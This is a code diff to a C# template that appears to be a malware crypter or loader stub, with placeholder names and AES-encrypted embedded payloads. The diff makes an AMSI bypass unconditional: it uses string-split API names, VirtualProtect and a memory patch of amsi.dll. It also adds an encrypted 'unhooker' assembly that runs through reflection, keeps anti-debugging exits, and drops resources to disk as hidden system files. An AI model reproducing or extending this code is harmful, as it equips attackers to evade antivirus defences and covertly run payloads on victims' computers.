@@ -21,9 +21,7 @@ namespace namespace_name
         [DllImport("kernel32.dll")]
         static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
-#if AMSI_BYPASS
         delegate bool virtualprotect_name(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-#endif
 #if ANTI_DEBUG
         delegate bool checkremotedebugger_name(IntPtr hProcess, ref bool isDebuggerPresent);
         delegate bool isdebuggerpresent_name();
@@ -47,11 +45,7 @@ namespace namespace_name
             searcher.Dispose();
 #endif
 
-#if AMSI_BYPASS
             IntPtr kmodule = LoadLibrary("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l");
-#elif ANTI_DEBUG
-            IntPtr kmodule = LoadLibrary("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l");
-#endif
 
 #if ANTI_DEBUG
             IntPtr crdpaddr = GetProcAddress(kmodule, Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("checkremotedebugger_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"))));
@@ -63,7 +57,6 @@ namespace namespace_name
             if (Debugger.IsAttached || remotedebug || IsDebuggerPresent()) Environment.Exit(1);
 #endif
 
-#if AMSI_BYPASS
             IntPtr vpaddr = GetProcAddress(kmodule, "V" + "i" + "r" + "t" + "u" + "a" + "l" + "P" + "r" + "o" + "t" + "e" + "c" + "t");
             virtualprotect_name VirtualProtect = (virtualprotect_name)Marshal.GetDelegateForFunctionPointer(vpaddr, typeof(virtualprotect_name));
             IntPtr amsimodule = LoadLibrary("a" + "m" + "s" + "i" + "." + "d" + "l" + "l");
@@ -75,15 +68,20 @@ namespace namespace_name
             VirtualProtect(asbaddr, (UIntPtr)patch.Length, 0x40, out old);
             Marshal.Copy(patch, 0, asbaddr, patch.Length);
             VirtualProtect(asbaddr, (UIntPtr)patch.Length, old, out old);
-#endif
 
             string payloadstr = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("payloadtxt_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
             string runpestr = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("runpedlltxt_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
+            string unhookerstr = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("unhookertxt_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
+
+            Assembly unhookerasm = Assembly.Load(uncompressfunction_name(aesfunction_name(getembeddedresourcefunction_name(unhookerstr), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"))));
+            string unhookerclass = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("unhookerclass_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
+            string unhookerfunction = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("unhookerfunction_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
+            unhookerasm.GetType(unhookerclass).GetMethod(unhookerfunction).Invoke(null, null);
 
             Assembly asm = Assembly.GetExecutingAssembly();
             foreach (string name in asm.GetManifestResourceNames())
             {
-                if (name == payloadstr || name == runpestr) continue;
+                if (name == payloadstr || name == runpestr || name == unhookerstr) continue;
                 File.WriteAllBytes(name, getembeddedresourcefunction_name(name));
                 File.SetAttributes(name, FileAttributes.Hidden | FileAttributes.System);
                 new Thread(() =>
